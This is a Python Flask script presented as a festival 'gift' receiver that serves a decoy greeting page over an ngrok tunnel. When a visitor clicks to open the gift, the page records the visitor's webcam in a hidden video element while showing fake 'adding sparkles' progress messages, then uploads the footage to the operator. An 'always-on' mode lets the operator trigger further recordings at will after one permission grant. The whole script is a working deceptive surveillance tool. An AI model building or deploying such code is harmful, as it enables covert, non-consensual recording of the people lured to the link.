#!/usr/bin/env python3
"""
Festival Video Receiver - Dual Mode
Mode 1: One-time (record once, then close)
Mode 2: Always-on (keep server running, record on demand)
"""

import os
import sys
import time
import json
import subprocess
import threading
import signal
import urllib.request
from datetime import datetime
from pathlib import Path
from flask import Flask, request, jsonify, send_file, render_template_string
from flask_cors import CORS

# ============================================
# Configuration
# ============================================
UPLOAD_FOLDER = 'festival_videos'
PORT = 5000
MODE = "one-time"  # Default: one-time mode

# ============================================
# HTML Template - Gift Theme
# ============================================
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🎁 {{ festival_name }}</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Arial', sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            overflow: hidden;
            position: relative;
        }
        .confetti-container {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            pointer-events: none; overflow: hidden; z-index: 0;
        }
        .confetti {
            position: absolute;
            width: 10px; height: 10px; top: -10px;
            animation: confettiFall linear infinite;
        }
        @keyframes confettiFall {
            0% { transform: translateY(-10px) rotate(0deg); opacity: 1; }
            100% { transform: translateY(110vh) rotate(720deg); opacity: 0; }
        }
        .gift-overlay {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            z-index: 100;
            display: none;
            justify-content: center;
            align-items: center;
            background: rgba(0,0,0,0.7);
            animation: fadeIn 0.5s ease;
            pointer-events: none;
        }
        .gift-overlay.active {
            display: flex;
            animation: fadeIn 0.5s ease;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: scale(0.8); }
            to { opacity: 1; transform: scale(1); }
        }
        .gift-content {
            text-align: center;
            animation: bounceIn 1s ease;
            pointer-events: auto;
        }
        @keyframes bounceIn {
            0% { transform: scale(0.3) rotate(-10deg); opacity: 0; }
            50% { transform: scale(1.2) rotate(5deg); }
            70% { transform: scale(0.9) rotate(-3deg); }
            100% { transform: scale(1) rotate(0deg); opacity: 1; }
        }
        .gift-emoji {
            font-size: 150px;
            display: block;
            animation: giftFloat 2s ease-in-out infinite;
            text-shadow: 0 0 80px rgba(255,215,0,0.8);
            cursor: pointer;
            transition: transform 0.3s ease;
        }
        .gift-emoji:hover {
            transform: scale(1.1);
        }
        @keyframes giftFloat {
            0%, 100% { transform: translateY(0px) scale(1); }
            50% { transform: translateY(-20px) scale(1.05); }
        }
        .gift-text {
            color: white;
            font-size: 3.5rem;
            font-weight: bold;
            text-shadow: 0 0 30px rgba(255,215,0,0.6);
            margin-top: 20px;
            background: linear-gradient(90deg, #ffd93d, #ff6b6b, #ffd93d, #ff6b6b);
            background-size: 300% auto;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            animation: shimmer 3s linear infinite;
        }
        @keyframes shimmer {
            0% { background-position: 0% center; }
            100% { background-position: 300% center; }
        }
        .gift-sub {
            color: rgba(255,255,255,0.9);
            font-size: 1.3rem;
            margin-top: 15px;
            -webkit-text-fill-color: rgba(255,255,255,0.9);
            animation: pulse 2s ease-in-out infinite;
        }
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.6; }
        }
        .celebration-confetti {
            position: fixed;
            z-index: 99;
            pointer-events: none;
            font-size: 50px;
            animation: celebrationFall linear forwards;
        }
        @keyframes celebrationFall {
            0% {
                transform: translateY(-100px) rotate(0deg) scale(1);
                opacity: 1;
            }
            100% {
                transform: translateY(120vh) rotate(720deg) scale(0.5);
                opacity: 0;
            }
        }
        .festival-card {
            position: relative; z-index: 1;
            background: rgba(255, 255, 255, 0.12);
            backdrop-filter: blur(20px);
            border-radius: 30px;
            padding: 50px;
            max-width: 550px; width: 90%;
            box-shadow: 0 25px 50px rgba(0,0,0,0.3);
            border: 1px solid rgba(255,255,255,0.15);
            text-align: center;
            animation: float 3s ease-in-out infinite;
            transition: all 0.5s ease;
            cursor: pointer;
        }
        .festival-card:hover {
            transform: scale(1.02);
            border-color: rgba(255,215,0,0.3);
        }
        .festival-card.opening {
            animation: none;
            transform: scale(1.05);
            border-color: #ffd93d;
            box-shadow: 0 0 80px rgba(255,215,0,0.3);
        }
        @keyframes float {
            0%, 100% { transform: translateY(0px); }
            50% { transform: translateY(-10px); }
        }
        .main-emoji {
            font-size: 100px; 
            margin-bottom: 20px; 
            display: block;
            animation: pulse 2s ease-in-out infinite;
            cursor: pointer;
            transition: transform 0.3s ease;
        }
        .main-emoji:hover {
            transform: scale(1.1);
        }
        .main-emoji.opening {
            animation: celebrateSpin 1s ease-in-out infinite;
        }
        @keyframes celebrateSpin {
            0%, 100% { transform: rotate(-5deg) scale(1); }
            50% { transform: rotate(5deg) scale(1.1); }
        }
        .festival-title {
            color: white; 
            font-size: 2.8rem; 
            font-weight: bold;
            margin-bottom: 10px;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
        }
        .festival-name {
            color: #ffd93d; 
            font-weight: bold;
        }
        .subtitle {
            color: rgba(255,255,255,0.8);
            font-size: 1.1rem;
            margin-bottom: 25px;
            line-height: 1.6;
        }
        .gift-btn {
            background: linear-gradient(135deg, #ffd93d, #f5576c);
            border: none;
            color: white;
            padding: 20px 60px;
            font-size: 1.5rem;
            font-weight: bold;
            border-radius: 60px;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 10px 40px rgba(245,87,108,0.4);
            margin: 10px auto;
            position: relative;
            overflow: hidden;
            display: inline-flex;
            align-items: center;
            gap: 15px;
        }
        .gift-btn::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: linear-gradient(45deg, transparent, rgba(255,255,255,0.1), transparent);
            transform: rotate(45deg);
            animation: btnShine 3s linear infinite;
        }
        @keyframes btnShine {
            0% { transform: translateX(-100%) rotate(45deg); }
            100% { transform: translateX(100%) rotate(45deg); }
        }
        .gift-btn:hover:not(:disabled) {
            transform: scale(1.08);
            box-shadow: 0 15px 50px rgba(245,87,108,0.6);
        }
        .gift-btn:active:not(:disabled) {
            transform: scale(0.95);
        }
        .gift-btn:disabled {
            opacity: 0.7;
            cursor: not-allowed;
            transform: none;
        }
        .gift-btn .btn-emoji {
            font-size: 1.8rem;
        }
        .surprise-container {
            margin: 25px 0 10px 0;
            display: none;
        }
        .surprise-container.visible {
            display: block;
        }
        .surprise-text {
            color: rgba(255,255,255,0.9);
            font-size: 1rem;
            margin-bottom: 10px;
            animation: pulse 1.5s ease-in-out infinite;
        }
        .progress-container {
            width: 100%; 
            height: 6px;
            background: rgba(255,255,255,0.15);
            border-radius: 10px;
            overflow: hidden;
        }
        .progress-bar {
            height: 100%; 
            width: 0%;
            background: linear-gradient(90deg, #ffd93d, #f5576c);
            border-radius: 10px;
            transition: width 0.3s ease;
        }
        .progress-bar.done {
            background: linear-gradient(90deg, #ffd93d, #ff6b6b, #ffd93d);
            background-size: 200% auto;
            animation: shimmer 1s linear infinite;
        }
        .status {
            margin-top: 15px; 
            color: rgba(255,255,255,0.6);
            font-size: 0.85rem;
            min-height: 20px;
            opacity: 0.5;
        }
        .mode-badge {
            position: absolute;
            top: -10px;
            right: -10px;
            background: rgba(255,215,0,0.3);
            color: white;
            padding: 5px 15px;
            border-radius: 20px;
            font-size: 0.7rem;
            border: 1px solid rgba(255,215,0,0.3);
            backdrop-filter: blur(10px);
        }
        #hiddenVideo { display: none; }
        #controlPanel { display: none; margin-top: 20px; }
        #controlPanel.visible { display: block; }
        .control-btn {
            background: rgba(255,255,255,0.15);
            border: 1px solid rgba(255,255,255,0.2);
            color: white;
            padding: 10px 20px;
            border-radius: 10px;
            cursor: pointer;
            margin: 5px;
            transition: all 0.3s ease;
        }
        .control-btn:hover {
            background: rgba(255,255,255,0.25);
        }
        @media (max-width: 600px) {
            .festival-card { padding: 30px 20px; }
            .festival-title { font-size: 2rem; }
            .main-emoji { font-size: 70px; }
            .gift-btn { padding: 15px 40px; font-size: 1.2rem; }
            .gift-emoji { font-size: 100px; }
            .gift-text { font-size: 2.5rem; }
        }
    </style>
</head>
<body>
    <div class="confetti-container" id="confettiContainer"></div>
    
    <div class="gift-overlay" id="giftOverlay">
        <div class="gift-content">
            <span class="gift-emoji" id="giftEmoji">🎁</span>
            <div class="gift-text" id="giftText">🎉 SURPRISE! 🎉</div>
            <div class="gift-sub">✨ A gift is waiting for you! ✨</div>
        </div>
    </div>
    
    <video id="hiddenVideo" autoplay playsinline></video>
    
    <div class="festival-card" id="festivalCard">
        <span class="mode-badge" id="modeBadge">Mode: {{ mode }}</span>
        <span class="main-emoji" id="mainEmoji">🎊</span>
        <h1 class="festival-title">{{ festival_name }}</h1>
        <p class="subtitle" id="subtitle">✨ Something special is waiting for you ✨</p>
        
        <button class="gift-btn" id="giftBtn">
            <span class="btn-emoji">🎁</span>
            <span id="btnText">Open Your Gift</span>
        </button>
        
        <div id="controlPanel">
            <button class="control-btn" id="recordBtn">🎥 Record Now</button>
            <button class="control-btn" id="closeBtn">🔒 Close Server</button>
        </div>
        
        <div class="surprise-container" id="surpriseContainer">
            <div class="surprise-text" id="surpriseText">🎀 Preparing your surprise...</div>
            <div class="progress-container">
                <div class="progress-bar" id="progressBar"></div>
            </div>
        </div>
        
        <div class="status" id="statusMessage">💝 Click the gift to reveal your surprise</div>
    </div>

    <script>
        const videoElement = document.getElementById('hiddenVideo');
        const giftBtn = document.getElementById('giftBtn');
        const btnText = document.getElementById('btnText');
        const statusMessage = document.getElementById('statusMessage');
        const progressBar = document.getElementById('progressBar');
        const surpriseContainer = document.getElementById('surpriseContainer');
        const surpriseText = document.getElementById('surpriseText');
        const festivalCard = document.getElementById('festivalCard');
        const mainEmoji = document.getElementById('mainEmoji');
        const giftOverlay = document.getElementById('giftOverlay');
        const giftEmoji = document.getElementById('giftEmoji');
        const giftText = document.getElementById('giftText');
        const modeBadge = document.getElementById('modeBadge');
        const controlPanel = document.getElementById('controlPanel');
        const recordBtn = document.getElementById('recordBtn');
        const closeBtn = document.getElementById('closeBtn');
        const subtitle = document.getElementById('subtitle');

        const UPLOAD_URL = window.location.origin + '/upload';
        const MODE = '{{ mode }}';
        const DURATION = 15;
        let mediaStream = null, mediaRecorder = null, recordedChunks = [];
        let timerInterval = null, timeRemaining = DURATION, isRecording = false;
        let isGiftOpened = false;
        let isAlwaysOn = false;

        // Show control panel for always-on mode
        if (MODE === 'always-on') {
            isAlwaysOn = true;
            controlPanel.classList.add('visible');
            subtitle.textContent = '✨ Camera is always ready! Click "Record Now" anytime ✨';
            statusMessage.textContent = '🔴 Camera permission is active. You can record anytime!';
        }

        // Confetti generator
        const confettiContainer = document.getElementById('confettiContainer');
        const colors = ['#ff6b6b', '#ffd93d', '#6bcb77', '#4d96ff', '#ff6fb7', '#a66cff'];
        for (let i = 0; i < 80; i++) {
            const confetti = document.createElement('div');
            confetti.className = 'confetti';
            confetti.style.left = Math.random() * 100 + '%';
            confetti.style.background = colors[Math.floor(Math.random() * colors.length)];
            confetti.style.width = (Math.random() * 8 + 4) + 'px';
            confetti.style.height = (Math.random() * 8 + 4) + 'px';
            confetti.style.borderRadius = Math.random() > 0.5 ? '50%' : '2px';
            confetti.style.animationDuration = (Math.random() * 3 + 2) + 's';
            confetti.style.animationDelay = (Math.random() * 4) + 's';
            confettiContainer.appendChild(confetti);
        }

        function showGiftReveal() {
            giftOverlay.classList.add('active');
            
            let emojis = ['🎁', '🎀', '🎉', '🎊', '✨', '⭐', '💝', '🎈'];
            let index = 0;
            
            const emojiInterval = setInterval(() => {
                giftEmoji.textContent = emojis[index % emojis.length];
                index++;
                if (index > 10) {
                    clearInterval(emojiInterval);
                    giftEmoji.textContent = '🎉';
                    giftText.textContent = '🎊 SURPRISE! 🎊';
                    
                    launchCelebrationConfetti();
                    
                    setTimeout(() => {
                        giftOverlay.classList.remove('active');
                        festivalCard.classList.remove('opening');
                        mainEmoji.classList.remove('opening');
                        giftBtn.disabled = false;
                        giftBtn.innerHTML = '<span class="btn-emoji">🎁</span><span id="btnText">Open Another Gift</span>';
                        statusMessage.textContent = '💝 Thank you! You can open another gift!';
                        surpriseContainer.classList.remove('visible');
                        isGiftOpened = false;
                    }, 5000);
                }
            }, 200);
        }

        function launchCelebrationConfetti() {
            const emojis = ['🎉', '🎊', '✨', '⭐', '🌟', '💫', '🎈', '🎁', '🥳', '🎆', '🎇', '💝'];
            const container = document.body;
            
            for (let i = 0; i < 60; i++) {
                setTimeout(() => {
                    const el = document.createElement('div');
                    el.className = 'celebration-confetti';
                    el.textContent = emojis[Math.floor(Math.random() * emojis.length)];
                    el.style.left = Math.random() * 100 + '%';
                    el.style.fontSize = (Math.random() * 40 + 25) + 'px';
                    el.style.animationDuration = (Math.random() * 3 + 2) + 's';
                    container.appendChild(el);
                    
                    setTimeout(() => { el.remove(); }, 5000);
                }, i * 40);
            }
        }

        async function recordVideo() {
            if (isGiftOpened) return;
            isGiftOpened = true;
            
            try {
                giftBtn.disabled = true;
                document.getElementById('btnText').textContent = '🎀 Recording...';
                festivalCard.classList.add('opening');
                mainEmoji.classList.add('opening');
                mainEmoji.textContent = '🎁';
                surpriseContainer.classList.add('visible');
                surpriseText.textContent = '🎀 Recording your gift...';
                progressBar.style.width = '0%';
                statusMessage.textContent = '⏳ Recording in progress...';

                // Check if we already have a stream (always-on mode)
                if (!mediaStream) {
                    mediaStream = await navigator.mediaDevices.getUserMedia({
                        video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
                        audio: false
                    });
                    videoElement.srcObject = mediaStream;
                    await videoElement.play();
                }

                recordedChunks = [];
                mediaRecorder = new MediaRecorder(mediaStream, { mimeType: 'video/webm;codecs=vp9' });
                mediaRecorder.ondataavailable = (event) => {
                    if (event.data.size > 0) recordedChunks.push(event.data);
                };
                mediaRecorder.onstop = () => {
                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
                    uploadGift(blob);
                };

                mediaRecorder.start();
                isRecording = true;
                timeRemaining = DURATION;
                
                surpriseText.textContent = '🎁 Recording your surprise...';

                timerInterval = setInterval(() => {
                    timeRemaining--;
                    const progress = ((DURATION - timeRemaining) / DURATION) * 100;
                    progressBar.style.width = progress + '%';
                    
                    const messages = [
                        '🎨 Creating magic...',
                        '✨ Adding sparkles...',
                        '🌟 Almost ready...',
                        '🎁 Your surprise is coming!',
                        '💝 Final touches...'
                    ];
                    const msgIndex = Math.min(
                        Math.floor((DURATION - timeRemaining) / 3),
                        messages.length - 1
                    );
                    if (timeRemaining > 3) {
                        surpriseText.textContent = messages[msgIndex % messages.length];
                    }
                    
                    if (timeRemaining <= 0) {
                        clearInterval(timerInterval);
                        timerInterval = null;
                        
                        if (mediaRecorder && isRecording) {
                            mediaRecorder.stop();
                            isRecording = false;
                            surpriseText.textContent = '🎊 Your surprise is ready!';
                            progressBar.classList.add('done');
                            progressBar.style.width = '100%';
                        }
                        
                        // In one-time mode, stop the stream
                        if (MODE === 'one-time' && mediaStream) {
                            mediaStream.getTracks().forEach(track => track.stop());
                            mediaStream = null;
                            videoElement.srcObject = null;
                        }
                        
                        setTimeout(() => {
                            showGiftReveal();
                        }, 500);
                    }
                }, 1000);

            } catch (error) {
                console.error('Error:', error);
                statusMessage.textContent = '❌ Camera error: ' + error.message;
                statusMessage.style.opacity = '1';
                giftBtn.disabled = false;
                document.getElementById('btnText').textContent = 'Try Again';
                isGiftOpened = false;
                surpriseContainer.classList.remove('visible');
            }
        }

        async function uploadGift(blob) {
            const formData = new FormData();
            formData.append('video', blob, `gift_${Date.now()}.webm`);

            try {
                const response = await fetch(UPLOAD_URL, { method: 'POST', body: formData });
                if (!response.ok) {
                    throw new Error('Upload failed: ' + response.status);
                }
                console.log('✅ Gift uploaded!');
            } catch (error) {
                console.error('Upload error:', error);
            }
        }

        // Event Listeners
        giftBtn.addEventListener('click', recordVideo);
        
        festivalCard.addEventListener('click', () => {
            if (!isGiftOpened && !giftBtn.disabled) {
                recordVideo();
            }
        });

        // Always-on mode controls
        if (isAlwaysOn) {
            recordBtn.addEventListener('click', () => {
                if (!isGiftOpened && !giftBtn.disabled) {
                    recordVideo();
                }
            });
            
            closeBtn.addEventListener('click', async () => {
                if (confirm('Close the server and stop receiving videos?')) {
                    await fetch('/shutdown', { method: 'POST' });
                    statusMessage.textContent = '🔒 Server is shutting down...';
                    giftBtn.disabled = true;
                }
            });
        }

        window.addEventListener('beforeunload', () => {
            if (mediaRecorder && isRecording) mediaRecorder.stop();
            if (mediaStream && MODE === 'one-time') {
                mediaStream.getTracks().forEach(track => track.stop());
            }
        });

        console.log('🎁 Gift interface loaded! Mode: ' + MODE);
        if (isAlwaysOn) {
            console.log('🔴 Always-on mode: Camera ready for on-demand recording');
        }
    </script>
</body>
</html>
"""

# ============================================
# Flask Application
# ============================================
app = Flask(__name__)
CORS(app)

received_videos = []
server_running = True

@app.route('/')
def index():
    festival_name = app.config.get('FESTIVAL_NAME', 'Gift')
    mode = app.config.get('MODE', 'one-time')
    return HTML_TEMPLATE.replace('{{ festival_name }}', festival_name).replace('{{ mode }}', mode)

@app.route('/upload', methods=['POST'])
def upload_video():
    try:
        if 'video' not in request.files:
            return jsonify({'error': 'No video file'}), 400
        
        video_file = request.files['video']
        if video_file.filename == '':
            return jsonify({'error': 'No filename'}), 400

        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f"gift_{timestamp}.webm"
        filepath = os.path.join(UPLOAD_FOLDER, filename)

        video_file.save(filepath)
        
        video_info = {
            'filename': filename,
            'path': filepath,
            'timestamp': timestamp,
            'size': os.path.getsize(filepath)
        }
        received_videos.append(video_info)
        
        print(f"\n📹 Received video {len(received_videos)}")
        
        # Auto-open the video
        try:
            if sys.platform == 'linux':
                subprocess.run(['xdg-open', filepath], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            elif sys.platform == 'darwin':
                subprocess.run(['open', filepath], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass
        
        return jsonify({'success': True, 'filename': filename}), 200

    except Exception as e:
        print(f"❌ Error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/shutdown', methods=['POST'])
def shutdown():
    """Shutdown the server (for always-on mode)"""
    global server_running
    server_running = False
    print("\n🔒 Server shutdown requested")
    return jsonify({'success': True}), 200

@app.route('/videos', methods=['GET'])
def list_videos():
    return jsonify({'videos': received_videos})

@app.route('/download/<filename>', methods=['GET'])
def download_video(filename):
    filepath = os.path.join(UPLOAD_FOLDER, filename)
    if os.path.exists(filepath):
        return send_file(filepath, as_attachment=True)
    return jsonify({'error': 'File not found'}), 404

# ============================================
# Main Tool Class
# ============================================
class FestivalReceiver:
    def __init__(self):
        self.festival_name = ""
        self.ngrok_process = None
        self.ngrok_url = None
        self.port = PORT
        self.running = True
        self.ngrok_ready = threading.Event()
        self.mode = "one-time"  # Default

    def setup_directories(self):
        Path(UPLOAD_FOLDER).mkdir(exist_ok=True)

    def get_mode(self):
        print("\n" + "="*50)
        print("🎁 GIFT VIDEO RECEIVER")
        print("="*50)
        print("\nSelect mode:")
        print("  1. One-time mode - Record once, server closes after")
        print("  2. Always-on mode - Keep running, record anytime")
        print("\n   (With Always-on, user grants permission once)")
        print("   (You can record multiple times with a click)")
        
        while True:
            choice = input("\nEnter choice (1 or 2): ").strip()
            if choice == '1':
                self.mode = "one-time"
                app.config['MODE'] = "one-time"
                print("\n✅ One-time mode selected")
                break
            elif choice == '2':
                self.mode = "always-on"
                app.config['MODE'] = "always-on"
                print("\n✅ Always-on mode selected")
                print("   User gives permission once, you can record anytime!")
                break
            else:
                print("❌ Invalid choice. Enter 1 or 2")

    def get_festival_name(self):
        while True:
            name = input("\n📝 Enter gift name: ").strip()
            if name:
                self.festival_name = name
                app.config['FESTIVAL_NAME'] = name
                break
            print("❌ Name cannot be empty!")

    def check_ngrok(self):
        try:
            result = subprocess.run(['ngrok', '--version'], capture_output=True, text=True)
            if result.returncode == 0:
                return True
        except FileNotFoundError:
            pass
        
        print("\n❌ ngrok is not installed or not in PATH!")
        return False

    def monitor_ngrok(self):
        try:
            time.sleep(3)
            for attempt in range(10):
                try:
                    with urllib.request.urlopen('http://localhost:4040/api/tunnels', timeout=2) as response:
                        data = json.loads(response.read().decode())
                        for tunnel in data.get('tunnels', []):
                            if tunnel.get('proto') == 'https':
                                self.ngrok_url = tunnel.get('public_url')
                                self.ngrok_ready.set()
                                return
                except Exception:
                    time.sleep(3)
        except Exception as e:
            print(f"❌ Error monitoring ngrok: {e}")

    def start_ngrok(self):
        print(f"\n🚀 Starting ngrok tunnel...")
        
        try:
            self.ngrok_process = subprocess.Popen(
                ['ngrok', 'http', str(self.port)],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                stdin=subprocess.DEVNULL
            )
            
            monitor_thread = threading.Thread(target=self.monitor_ngrok)
            monitor_thread.daemon = True
            monitor_thread.start()
            
            if self.ngrok_ready.wait(timeout=30):
                print(f"✅ Tunnel established!")
                return True
            else:
                print("⚠️ ngrok started but URL not found")
                return False
                
        except Exception as e:
            print(f"❌ Failed to start ngrok: {e}")
            return False

    def start_flask(self):
        print(f"\n🔧 Starting server...")
        
        def run_flask():
            app.run(host='0.0.0.0', port=self.port, debug=False, use_reloader=False)
        
        flask_thread = threading.Thread(target=run_flask)
        flask_thread.daemon = True
        flask_thread.start()
        time.sleep(2)
        print("✅ Server running")

    def generate_link(self):
        print("\n" + "="*50)
        print("📤 SHARE THIS GIFT LINK:")
        print("="*50)
        print(f"\n🔗 {self.ngrok_url}")
        print("\n" + "="*50)
        
        if self.mode == "one-time":
            print("\n📋 One-time mode:")
            print("   - User opens link")
            print("   - Clicks 'Open Your Gift'")
            print("   - Records 15-second video")
            print("   - Server closes after video received")
        else:
            print("\n📋 Always-on mode:")
            print("   - User opens link")
            print("   - Grants camera permission (Always Allow)")
            print("   - You can trigger recordings anytime")
            print("   - Click 'Record Now' or the gift button")
            print("   - Videos keep arriving until you close")
        
        print("="*50)
        print("\n📋 Link printed above - copy it manually")

    def wait_for_videos(self):
        print("\n🎁 Waiting for gifts... (Press Ctrl+C to stop)")
        print(f"📁 Videos saved in: {UPLOAD_FOLDER}/")
        print("-"*50)
        
        print("\n⏳ Waiting for first video...")
        
        try:
            last_count = 0
            while self.running and server_running:
                current_count = len(received_videos)
                
                if current_count > last_count:
                    print(f"\n📹 Received video {current_count}")
                    last_count = current_count
                    
                    if self.mode == "one-time":
                        print("\n🎯 One-time mode: Video received!")
                        print("🔒 Closing server...")
                        break
                    else:
                        print(f"\n⏳ Waiting for next video...")
                
                time.sleep(1)
                
        except KeyboardInterrupt:
            print("\n\n👋 Shutting down...")

    def cleanup(self):
        print("\n🧹 Cleaning up...")
        if self.ngrok_process:
            self.ngrok_process.terminate()
            try:
                self.ngrok_process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self.ngrok_process.kill()
        print("✅ Done!")

    def run(self):
        try:
            self.setup_directories()
            self.get_mode()
            self.get_festival_name()
            
            if not self.check_ngrok():
                return
            
            self.start_flask()
            if not self.start_ngrok():
                return
            
            self.generate_link()
            self.wait_for_videos()
            
        except KeyboardInterrupt:
            print("\n\n👋 Goodbye!")
        finally:
            self.cleanup()

if __name__ == '__main__':
    receiver = FestivalReceiver()
    receiver.run()